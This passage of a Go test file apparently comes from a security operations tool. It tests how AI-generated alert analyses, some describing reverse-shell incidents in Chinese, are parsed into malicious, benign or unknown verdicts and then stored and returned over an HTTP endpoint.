	content := "经分析该行为属于误报，但同时具有恶意外联特征"
	for i := 0; i < 100; i++ {
		conclusion := parseConclusionFromAnswer(content)
		if conclusion["verdict"] != "malicious" {
			t.Fatalf("iteration %d: expected verdict 'malicious', got %v", i, conclusion["verdict"])
		}
	}
}

func TestParseConclusionFromAnswer_StructuredJSON_UnrecognizedAction(t *testing.T) {
	content := `{
  "attack_graph": {"summary": "分析完成"},
  "conclusions": [
    {"alert_id": "ALT-001", "action": "custom_action", "summary": "自定义操作"}
  ]
}`
	conclusion := parseConclusionFromAnswer(content)
	// Unrecognized action should produce "unknown" verdict
	if conclusion["verdict"] != "unknown" {
		t.Fatalf("expected verdict 'unknown' for unrecognized action, got %v", conclusion["verdict"])
	}
}

func TestParseConclusionFromAnswer_VeryLongContent(t *testing.T) {
	// Create content longer than 200 runes
	content := strings.Repeat("这是一个很长的分析结果", 50) // 500 runes
	conclusion := parseConclusionFromAnswer(content)
	if conclusion["verdict"] != "unknown" {
		t.Fatalf("expected verdict 'unknown', got %v", conclusion["verdict"])
	}
	summary, ok := conclusion["summary"].(string)
	if !ok {
		t.Fatalf("expected summary to be string, got %T", conclusion["summary"])
	}
	if !strings.HasSuffix(summary, "...") {
		t.Fatalf("expected summary to be truncated with '...', got %q", summary)
	}
	if len([]rune(summary)) > 210 { // 200 chars + "..."
		t.Fatalf("expected summary to be ~200 runes, got %d", len([]rune(summary)))
	}
}

func TestGetSessionHistoryReturnsAlerts(t *testing.T) {
	gin.SetMode(gin.TestMode)
	handler := NewAIAnalysisHandler(nil, nil, nil, nil, nil, nil, nil, nil, nil, nil)

	sessionID := "test-session-alerts"
	now := time.Now()
	handler.sessions[sessionID] = &AISSESion{
		SessionID:  sessionID,
		AlertIDs:   []string{"alert-1", "alert-2"},
		HostIDs:    []string{"host-1"},
		HostFilter: []string{"host-a"},
		CreatedAt:  now,
		Messages:   []*llm.AIMessage{},
		AlertSnapshots: []AlertContextSnapshot{
			{
				ID:        "internal-1",
				AlertID:   "ALT-001",
				Hostname:  "web-server-01",
				RuleTitle: "Suspicious Process Execution",
				MitreID:   "T1059",
				Severity:  "high",
				Status:    "pending",
				LastSeenAt: now,
			},
			{
				ID:        "internal-2",
				AlertID:   "ALT-002",
				Hostname:  "db-server-01",
				RuleTitle: "Unauthorized Access Attempt",
				MitreID:   "T1078",
				Severity:  "critical",
				Status:    "pending",
				LastSeenAt: now,
			},
		},
	}

	router := gin.New()
	router.GET("/ai/:session_id/history", handler.GetSessionHistory)

	req := httptest.NewRequest(http.MethodGet, "/ai/"+sessionID+"/history", nil)
	recorder := httptest.NewRecorder()
	router.ServeHTTP(recorder, req)

	if recorder.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", recorder.Code, recorder.Body.String())
	}

	var resp map[string]interface{}
	if err := json.Unmarshal(recorder.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}

	data, ok := resp["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected data to be a map, got %T", resp["data"])
	}

	alerts, ok := data["alerts"].([]interface{})
	if !ok {
		t.Fatalf("expected alerts to be an array, got %T", data["alerts"])
	}
	if len(alerts) != 2 {
		t.Fatalf("expected 2 alerts, got %d", len(alerts))
	}

	firstAlert := alerts[0].(map[string]interface{})
	if firstAlert["alert_id"] != "ALT-001" {
		t.Fatalf("expected first alert_id to be 'ALT-001', got %v", firstAlert["alert_id"])
	}
	if firstAlert["hostname"] != "web-server-01" {
		t.Fatalf("expected first hostname to be 'web-server-01', got %v", firstAlert["hostname"])
	}
	if firstAlert["severity"] != "high" {
		t.Fatalf("expected first severity to be 'high', got %v", firstAlert["severity"])
	}
}

func TestGetSessionHistoryReturnsEmptyAlertsWhenDeleted(t *testing.T) {
	gin.SetMode(gin.TestMode)
	handler := NewAIAnalysisHandler(nil, nil, nil, nil, nil, nil, nil, nil, nil, nil)

	sessionID := "test-session-no-alerts"
	handler.sessions[sessionID] = &AISSESion{
		SessionID:      sessionID,
		AlertIDs:       []string{"deleted-alert-1"},
		Messages:       []*llm.AIMessage{},
		AlertSnapshots: []AlertContextSnapshot{}, // Alerts were deleted
	}

	router := gin.New()
	router.GET("/ai/:session_id/history", handler.GetSessionHistory)

	req := httptest.NewRequest(http.MethodGet, "/ai/"+sessionID+"/history", nil)
	recorder := httptest.NewRecorder()
	router.ServeHTTP(recorder, req)

	if recorder.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d body=%s", recorder.Code, recorder.Body.String())
	}

	var resp map[string]interface{}
	if err := json.Unmarshal(recorder.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}

	data, ok := resp["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected data to be a map, got %T", resp["data"])
	}

	alerts, ok := data["alerts"].([]interface{})
	if !ok {
		t.Fatalf("expected alerts to be an array, got %T", data["alerts"])
	}
	if len(alerts) != 0 {
		t.Fatalf("expected 0 alerts when deleted, got %d", len(alerts))
	}
}

func TestBuildExecutionResultResponse_IncludesFinalAnswer(t *testing.T) {
	execID := uuid.New()
	finalAnswerContent := `该进程行为属于恶意攻击，建议立即阻断。`
	exec := &model.AgentExecution{
		ID:              execID,
		SessionID:       "session-fa-1",
		TaskID:          "task-fa-1",
		Status:          "completed",
		ExitReason:      "normal_completed",
		FinalAnswer:     finalAnswerContent,
		TotalDurationMs: 120000,
		StartedAt:       time.Now().Add(-2 * time.Minute),
		EndedAt:         time.Now(),
	}

	response := buildExecutionResultResponse(exec, nil, nil)

	fa, ok := response["final_answer"].(string)
	if !ok {
		t.Fatalf("expected final_answer to be a string, got %T", response["final_answer"])
	}
	if fa != finalAnswerContent {
		t.Fatalf("expected final_answer '%s', got '%s'", finalAnswerContent, fa)
	}
}

func TestBuildExecutionResultResponse_FinalAnswerWithStructuredJSON(t *testing.T) {
	execID := uuid.New()
	finalAnswerContent := `{"attack_graph":{"title":"反弹Shell攻击链","summary":"攻击者通过反弹shell获取权限"},"conclusions":[{"alert_id":"ALT-001","action":"confirm_threat","summary":"确认反弹shell攻击"}]}`
	exec := &model.AgentExecution{
		ID:              execID,
		SessionID:       "session-fa-2",
		TaskID:          "task-fa-2",
		Status:          "completed",
		ExitReason:      "normal_completed",
		FinalAnswer:     finalAnswerContent,
		TotalDurationMs: 180000,
		StartedAt:       time.Now().Add(-3 * time.Minute),
		EndedAt:         time.Now(),
	}

	response := buildExecutionResultResponse(exec, nil, nil)

	fa, ok := response["final_answer"].(string)
	if !ok {
		t.Fatalf("expected final_answer to be a string, got %T", response["final_answer"])
	}
	if fa != finalAnswerContent {
		t.Fatalf("expected final_answer to match original content, got '%s'", fa)
	}

	// Verify conclusion is also correctly parsed
	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious', got %v", conclusion["verdict"])
	}
}

func TestBuildExecutionResultResponse_EmptyFinalAnswer(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:              execID,
		SessionID:       "session-fa-3",
		TaskID:          "task-fa-3",
		Status:          "completed",
		ExitReason:      "normal_completed",
		FinalAnswer:     "",
		TotalDurationMs: 60000,
		StartedAt:       time.Now().Add(-1 * time.Minute),
		EndedAt:         time.Now(),
	}

	response := buildExecutionResultResponse(exec, nil, nil)

	fa, ok := response["final_answer"].(string)
	if !ok {
		t.Fatalf("expected final_answer to be a string, got %T", response["final_answer"])
	}
	if fa != "" {
		t.Fatalf("expected final_answer to be empty, got '%s'", fa)
	}
}

func TestBuildExecutionResultResponse_SessionConclusionTakesPrecedence(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:          execID,
		SessionID:   "session-sc-1",
		TaskID:      "task-sc-1",
		Status:      "completed",
		ExitReason:  "normal_completed",
		FinalAnswer: "some text without clear keywords",
		StartedAt:   time.Now().Add(-5 * time.Minute),
		EndedAt:     time.Now(),
	}

	// Session has a stored conclusion with malicious verdict (from persistAnalysisOutcome)
	sessionConclusion := model.JSONB{
		"verdict":   "malicious",
		"summary":   "确认反弹shell攻击",
		"reasoning": "检测到bash进程通过sshd拉起并建立外部连接",
	}

	response := buildExecutionResultResponse(exec, nil, sessionConclusion)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious' from session conclusion, got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "确认反弹shell攻击" {
		t.Fatalf("expected summary '确认反弹shell攻击' from session conclusion, got %v", conclusion["summary"])
	}
}

func TestBuildExecutionResultResponse_NilSessionConclusionFallsBack(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:          execID,
		SessionID:   "session-sc-2",
		TaskID:      "task-sc-2",
		Status:      "completed",
		ExitReason:  "normal_completed",
		FinalAnswer: "Benign / False Positive: 目标进程已退出",
		StartedAt:   time.Now().Add(-5 * time.Minute),
		EndedAt:     time.Now(),
	}

	// No session conclusion — should fall back to parseConclusionFromAnswer
	response := buildExecutionResultResponse(exec, nil, nil)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "benign" {
		t.Fatalf("expected verdict 'benign' from fallback, got %v", conclusion["verdict"])
	}
}

func TestBuildExecutionResultResponse_EmptySessionConclusionFallsBack(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:          execID,
		SessionID:   "session-sc-3",
		TaskID:      "task-sc-3",
		Status:      "completed",
		ExitReason:  "normal_completed",
		FinalAnswer: "Malicious: 检测到反弹Shell行为",
		StartedAt:   time.Now().Add(-5 * time.Minute),
		EndedAt:     time.Now(),
	}

	// Empty session conclusion — should fall back to parseConclusionFromAnswer
	emptyConclusion := model.JSONB{}
	response := buildExecutionResultResponse(exec, nil, emptyConclusion)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious' from fallback, got %v", conclusion["verdict"])
	}
}

// ---------------------------------------------------------------------------
// persistAnalysisOutcome: conclusion storage includes verdict field
// ---------------------------------------------------------------------------

// simulatePersistOutcome mimics the fixed persistAnalysisOutcome logic:
// extractFinalAnswerResult → buildVerdictFromConclusions → merge with raw result.
func simulatePersistOutcome(finalContent string) map[string]interface{} {
	result, err := extractFinalAnswerResult(finalContent)
	if err != nil {
		return parseConclusionFromAnswer(finalContent)
	}
	conclusionMap := buildVerdictFromConclusions(result, finalContent)
	conclusionMap["conclusions"] = result.Conclusions
	conclusionMap["attack_graph"] = result.AttackGraph
	return conclusionMap
}

func TestPersistOutcome_ConfirmThreatIncludesVerdict(t *testing.T) {
	content := `{
  "attack_graph": {
    "title": "反弹Shell攻击链路溯源",
    "summary": "攻击者通过 bash 执行反弹 shell",
    "threat_level": "high",
    "nodes": [{"id": "n1", "type": "process", "label": "bash"}],
    "edges": [],
    "timeline": [],
    "recommendations": ["隔离主机"]
  },
  "conclusions": [
    {"alert_id": "ALT-001", "action": "confirm_threat", "summary": "确认存在反弹 shell 行为"}
  ]
}`
	stored := simulatePersistOutcome(content)

	if stored["verdict"] != "malicious" {
		t.Fatalf("expected stored verdict 'malicious', got %v", stored["verdict"])
	}
	if stored["summary"] != "确认存在反弹 shell 行为" {
		t.Fatalf("expected stored summary from conclusion, got %v", stored["summary"])
	}
	if stored["reasoning"] == nil || stored["reasoning"] == "" {
		t.Fatal("expected stored reasoning to be non-empty")
	}
	// Verify conclusions array is preserved
	conclusions, ok := stored["conclusions"].([]AlertConclusion)
	if !ok || len(conclusions) != 1 {
		t.Fatalf("expected 1 conclusion in stored data, got %T %v", stored["conclusions"], stored["conclusions"])
	}
	// Verify attack_graph is preserved
	ag, ok := stored["attack_graph"].(map[string]interface{})
	if !ok || ag["title"] != "反弹Shell攻击链路溯源" {
		t.Fatalf("expected attack_graph to be preserved, got %v", stored["attack_graph"])
	}
}

func TestPersistOutcome_MarkFalsePositiveIncludesVerdict(t *testing.T) {
	content := `{
  "attack_graph": {"nodes": [], "edges": []},
  "conclusions": [
    {"alert_id": "ALT-002", "action": "mark_false_positive", "summary": "该告警为正常运维操作"}
  ]
}`
	stored := simulatePersistOutcome(content)

	if stored["verdict"] != "benign" {
		t.Fatalf("expected stored verdict 'benign', got %v", stored["verdict"])
	}
	if stored["summary"] != "该告警为正常运维操作" {
		t.Fatalf("expected stored summary, got %v", stored["summary"])
	}
}

func TestPersistOutcome_MixedConclusionsTakesMostSevere(t *testing.T) {
	content := `{
  "attack_graph": {"nodes": [], "edges": []},
  "conclusions": [
    {"alert_id": "ALT-001", "action": "mark_false_positive", "summary": "误报"},
    {"alert_id": "ALT-002", "action": "confirm_threat", "summary": "确认反弹shell攻击"},
    {"alert_id": "ALT-003", "action": "generate_rule", "summary": "建议生成规则"}
  ]
}`
	stored := simulatePersistOutcome(content)

	if stored["verdict"] != "malicious" {
		t.Fatalf("expected stored verdict 'malicious' (most severe), got %v", stored["verdict"])
	}
}

func TestPersistOutcome_FallbackToKeywordMatching(t *testing.T) {
	content := "经分析，确认该行为属于恶意攻击，建议立即处置"
	stored := simulatePersistOutcome(content)

	if stored["verdict"] != "malicious" {
		t.Fatalf("expected stored verdict 'malicious' from keyword fallback, got %v", stored["verdict"])
	}
}

func TestPersistOutcome_EmptyContent(t *testing.T) {
	stored := simulatePersistOutcome("")

	if stored["verdict"] != "unknown" {
		t.Fatalf("expected stored verdict 'unknown', got %v", stored["verdict"])
	}
	if stored["summary"] != "未生成结论" {
		t.Fatalf("expected summary '未生成结论', got %v", stored["summary"])
	}
}

func TestPersistOutcome_StoredConclusionWorksAsSessionConclusion(t *testing.T) {
	// This is the critical integration test:
	// 1. persistAnalysisOutcome stores a conclusion with verdict
	// 2. buildExecutionResultResponse receives it as sessionConclusion
	// 3. Frontend receives correct verdict
	content := `{
  "attack_graph": {
    "title": "反弹Shell攻击链",
    "nodes": [{"id": "n1", "type": "process", "label": "bash"}],
    "edges": []
  },
  "conclusions": [
    {"alert_id": "ALT-001", "action": "confirm_threat", "summary": "确认反弹shell攻击"}
  ]
}`
	stored := simulatePersistOutcome(content)

	// Simulate: buildExecutionResultResponse receives stored conclusion
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:          execID,
		SessionID:   "session-integration",
		TaskID:      "task-integration",
		Status:      "completed",
		ExitReason:  "normal_completed",
		FinalAnswer: content,
		StartedAt:   time.Now().Add(-5 * time.Minute),
		EndedAt:     time.Now(),
	}

	sessionConclusion := model.JSONB(stored)
	response := buildExecutionResultResponse(exec, nil, sessionConclusion)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious', got %v", conclusion["verdict"])
	}
	if conclusion["summary"] != "确认反弹shell攻击" {
		t.Fatalf("expected summary '确认反弹shell攻击', got %v", conclusion["summary"])
	}
	// Verify attack_graph is accessible from the stored conclusion
	ag, ok := conclusion["attack_graph"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected attack_graph in conclusion, got %T", conclusion["attack_graph"])
	}
	if ag["title"] != "反弹Shell攻击链" {
		t.Fatalf("expected attack_graph title, got %v", ag["title"])
	}
}

func TestBuildExecutionResultResponse_BackwardCompatibleConclusionDerivesVerdict(t *testing.T) {
	// Simulate old-format stored conclusion (no verdict field, only conclusions array)
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:          execID,
		SessionID:   "session-bc-1",
		TaskID:      "task-bc-1",
		Status:      "completed",
		ExitReason:  "normal_completed",
		FinalAnswer: "some text",
		StartedAt:   time.Now().Add(-5 * time.Minute),
		EndedAt:     time.Now(),
	}

	// Old format: conclusions array without verdict
	oldConclusion := model.JSONB{
		"conclusions": []interface{}{
			map[string]interface{}{
				"action":  "confirm_threat",
				"summary": "确认反弹shell攻击",
				"alert_id": "ALT-001",
			},
		},
		"attack_graph": map[string]interface{}{
			"title": "攻击链",
			"nodes": []interface{}{},
			"edges": []interface{}{},
		},
	}

	response := buildExecutionResultResponse(exec, nil, oldConclusion)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	// Should derive malicious from confirm_threat action
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious' derived from conclusions, got %v", conclusion["verdict"])
	}
}

func TestBuildExecutionResultResponse_BackwardCompatibleMixedConclusions(t *testing.T) {
	execID := uuid.New()
	exec := &model.AgentExecution{
		ID:          execID,
		SessionID:   "session-bc-2",
		TaskID:      "task-bc-2",
		Status:      "completed",
		ExitReason:  "normal_completed",
		FinalAnswer: "some text",
		StartedAt:   time.Now().Add(-5 * time.Minute),
		EndedAt:     time.Now(),
	}

	oldConclusion := model.JSONB{
		"conclusions": []interface{}{
			map[string]interface{}{
				"action":  "mark_false_positive",
				"summary": "误报",
			},
			map[string]interface{}{
				"action":  "confirm_threat",
				"summary": "确认威胁",
			},
		},
	}

	response := buildExecutionResultResponse(exec, nil, oldConclusion)

	conclusion, ok := response["conclusion"].(map[string]interface{})
	if !ok {
		t.Fatalf("expected conclusion to be a map, got %T", response["conclusion"])
	}
	if conclusion["verdict"] != "malicious" {
		t.Fatalf("expected verdict 'malicious' (most severe), got %v", conclusion["verdict"])
	}
}
